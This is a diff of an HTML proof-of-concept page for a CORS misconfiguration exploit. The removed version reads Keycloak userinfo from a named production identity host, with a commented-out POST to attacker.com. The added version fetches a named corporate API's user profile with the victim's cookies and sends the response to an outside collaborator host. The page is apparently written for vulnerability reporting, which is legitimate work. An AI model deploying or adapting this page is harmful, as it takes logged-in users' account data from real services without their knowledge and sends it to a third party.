@@ -1,57 +1,34 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Keycloak CORS Exploit PoC</title>
-  <style>
-    body { font-family: Arial, sans-serif; padding: 20px; }
-    pre { background: #f4f4f4; padding: 15px; border-radius: 5px; white-space: pre-wrap; }
-  </style>
-</head>
+<html>
 <body>
-  <h2>Keycloak CORS Exploit PoC – Proof of Reflection + Credentialed Fetch</h2>
-  <p>Open this file in a browser while logged into mystore.com.sa (or any app using prod-iam.mystore.com.sa Keycloak).</p>
-  <p><strong>Expected result:</strong> If CORS is broken (wildcard reflection + credentials:true), you should see JSON userinfo data below.</p>
-  <pre id="output">Loading userinfo from Keycloak...</pre>
 
-  <script>
-  async function stealKeycloakData() {
-    const kcBase = 'https://prod-iam.mystore.com.sa';
-    const output = document.getElementById('output');
+<h2>CORS Exploit PoC</h2>
+<pre id="out">Loading...</pre>
 
-    try {
-      // Attempt to fetch protected userinfo endpoint with credentials (cookies/tokens)
-      const response = await fetch(`${kcBase}/realms/master/protocol/openid-connect/userinfo`, {
-        method: 'GET',
-        credentials: 'include',           // ← sends cookies / auth headers cross-origin
-        mode: 'cors',
-        headers: {
-          'Accept': 'application/json'
-        }
-      });
+<script>
 
-      if (!response.ok) {
-        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
-      }
+fetch("https://advisortimetracker.kkr.com/api/v1/me", {
+  credentials: "include"
+})
+.then(r => r.text())
+.then(data => {
 
-      const data = await response.json();
-      output.textContent = JSON.stringify(data, null, 2);
+  // Show stolen response
+  document.getElementById("out").textContent = data;
 
-      // Optional: In real attack, exfiltrate here
-      // await fetch('https://attacker.com/collect', {
-      //   method: 'POST',
-      //   body: JSON.stringify(data),
-      //   credentials: 'include'
-      // });
-    } catch (error) {
-      output.textContent = `Error: ${error.message}\n\n` +
-                           `(If 401/403: endpoint requires login or CORS blocked this request)\n` +
-                           `(If data appears: CORS misconfig allows credentialed cross-origin read!)`;
-    }
-  }
+  // Exfiltrate to collaborator
+  fetch("https://bigzooooz.github.io/collaborator/", {
+    method: "POST",
+    mode: "no-cors",
+    body: data
+  });
 
-  // Call the function
-  stealKeycloakData();
-  </script>
+})
+.catch(e => {
+  document.getElementById("out").textContent = e;
+});
+
+</script>
+
 </body>
 </html>
